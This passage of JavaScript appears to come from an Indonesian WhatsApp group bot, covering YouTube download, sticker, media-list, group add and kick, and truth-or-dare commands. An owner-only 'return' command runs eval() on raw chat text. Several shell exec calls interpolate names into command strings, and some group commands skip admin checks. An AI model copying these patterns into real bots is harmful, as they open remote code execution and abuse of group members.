								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytsearch':
            if (!args.length) return reply('Cari Apa?')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `
┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ *Judul:* ${items[i].title}
├ *ID:* ${items[i].id}
├ *Ditonton:* ${items[i].views}
├ *Durasi:* ${items[i].duration}
└ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await nathan.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link yt] = Audio
└ ${prefix}ytmp4 [link yt] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
					case 'ytmp3':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*YTMP4*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf Durasi Melebihi Batas Maksimal, Silahkan Klik Link Diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
					        })
						} catch (err) {
							reply(mess.error.api)
						}
						break

	case 'play':

			if (args.length === 0) return reply(`Kirim Command *${prefix}play* _Judul Lagu_`)

            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulailah = aramat[0].url							
                  try {
                    yta(mulailah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                           
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY*\n\nTitle: ${title}\nExt : mp3\nFile Size : ${filesizeF}\nLink ${a.data}\n\n_Untuk Durasi Lebih Dari Batas Disajikan Malam Bentuk Link_`)
                        const captions = `*PLAY*\n\nTitle : ${title}\nExt : mp3\nFile Size : ${filesizeF}\nLink ${a.data}\n\n_Untuk Durasi Lebih Dari Batas Disajikan Dalam Bentuk Link_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
                            case 'video':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
                            const i = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulainya = i.data.result[0].url
                            try {
                                reply(mess.wait)
                                ytv(mulainya)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*MP4*\n\n *Title* : ${title}\n *Ext* : MP4\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf Durasi Melebihi Batas Maksimal, Silahkan Klik Link Diatas_`)
                                    sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done')
				break
				case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await nathan.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await nathan.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim Gambar/Video Dengan Caption ${prefix}sticker Atau Reply Gambar/Video Yang Ada\nNote : Durasi Video Maksimal 10 Detik`)
						}
						break
					case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await nathan.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await nathan.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim Gambar/Video Dengan Caption ${prefix}stickerwm Atau Reply Gambar/Video Yang Ada\nNote : Durasi Video Maksimal 10 Detik`)
						}
						break
					case 'takestick':
					case 'take':
						if (!isQuotedSticker) return reply(`Reply Sticker Dengan Caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await nathan.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
			case 'speed':
			case 'ping':
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Speed: ${latensyi.toFixed(4)} Second`)
					break
				case 'return':
				if (!isOwner) return reply(mess.only.ownerB)
					return nathan.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return nathan.sendMessage(from, `Root @Nathan:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await nathan.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await nathan.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							nathan.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break
				case 'ss':
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
				break
				case 'addsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedSticker) return reply('Reply Sticker')
					nm = body.slice(12)
					if (!nm) return reply('Nama Stickernya?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await nathan.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					nathan.sendMessage(from, `Sukses, Silahkan Cek Dengan Ketik *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 reply(`Sukses Menghapus Sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*List Sticker :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk Mengambil Sticker Silahkan Reply Pesan Ini Dengan Caption Nama Sticker_`
					nathan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Reply Audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama VNnya?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await nathan.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					nathan.sendMessage(from, `Sukses, Silahkan Cek Dengan Ketik *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses Menghapus VN ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
					teks = '*List VN :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk Mengambil VN Silahkan Reply Pesan Ini Dengan Caption Nama VN_`
					nathan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Reply Image')
					nm = body.slice(10)
					if (!nm) return reply('Nama Imagenya?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await nathan.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					nathan.sendMessage(from, `Sukses, Silahkan Cek Dengan Ketik *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 reply(`Sukses Menghapus Image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*List Image:*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk Mengambil Image Silahkan Reply Pesan Ini Dengan Caption Nama Image_`
					nathan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await nathan.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./media/sticker/${wanu[1]}.webp`)
				nathan.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
				runtime = process.uptime()
				reply(`Runtime : ${waktu(runtime)}`)
				break
			case 'setbio':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					nathan.setStatus(`${iyek}`)
					reply(`Sukses Mengganti Bio Menjadi ${body.slice(8)}`)
					break
					case 'setname':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                nathan.updateProfileName(anu)
                reply(`Sukses Mengganti Nama Menjadi ${body.slice(9)}`)
                break
//------------ <Add/Kick >-----------------\\
		case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('Mau Add Jin Bang?')
					if (args[0].startsWith('08')) return reply('Gunakan Kode Negara Kak. Contoh : 62xxxxxxxxxx')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						nathan.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal Menambahkan Target, Mungkin Karena Di Private')
					}
					break
case 'kick':
					if (!isGroup) return reply(mess.only.group) 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag Target Yang Ingin Di Kick! Contoh : @user')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah Diterima, Mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						nathan.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah Di Terima, Mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
						nathan.groupRemove(from, mentioned)
					}
					break
			case 'ad':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply Pesan Targetnya!')
			add = mek.message.extendedTextMessage.contextInfo.participant
		    nathan.groupAdd(from, [add])
				reply('Sukses Menambahkan Peserta')
				break
				case 'kik':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply Pesan Target!')
			kick = mek.message.extendedTextMessage.contextInfo.participant
		    nathan.groupRemove(from, [kick])
						reply('Sukses Mengeluarkan Member')
                    break
//------------ <Add/Kick >-----------------\\
                    case 'creategroup':
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					nathan.groupCreate(argz[0], anu)
					reply(`Sukses Membuat Grup ${argz[0]}`)
                }
				break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses Menambahkan Respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses Menghapus Respon ${body.slice(11)}`)
				break
case 'bisakah':
  if (!isGroup) return reply(mess.only.group)
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA SAYA TAU','YNTKTS']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              nathan.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              break
       case 'kapankah':
         if (!isGroup) return reply(mess.only.group)
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','YNTKTS']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              nathan.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
       case 'truth':
              if (!isGroup) return reply(mess.only.group)
              const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              nathan.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
              break
       case 'dare':
              if (!isGroup) return reply(mess.only.group)
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
              buffer = await getBuffer(`https://i.ibb.co/cyM9YyH/logoku.jpg`)
              nathan.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
              break
case 'gantengcek':
       case 'cekganteng':
              if (!isGroup) return reply(mess.only.group)
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              nathan.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              break
case 'cantikcek':
       case 'cekcantik':
              if (!isGroup) return reply(mess.only.group)
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              nathan.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              break
case 'cekmati':
              if (!isGroup) return reply(mess.only.group)
              predea = await axios.get(`https://api.agify.io/?name=${c}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati Tidak Ada Yang Tahu_`)
              break
		default:break
		}
		if (isTTT && iser2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Game Tictactoe 🎲*

er1 @${tty.er1.split('@')[0]}=❌
er2 @${tty.er2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran = @${tty.er1.split('@')[0]}`
  nathan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
nathan.sendMessage(from, `Yahh @${tty.er2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.er2]}})
}
}

if (isTTT && iser1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Posisi Telah Diisi, Pilih Yang Lain')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].er1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Result Game Tictactoe 🎲

*Yeyyy Permainan Di Menangkan Oleh *@${tty.er1.split('@')[0]}*\n`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
nathan.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.er1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

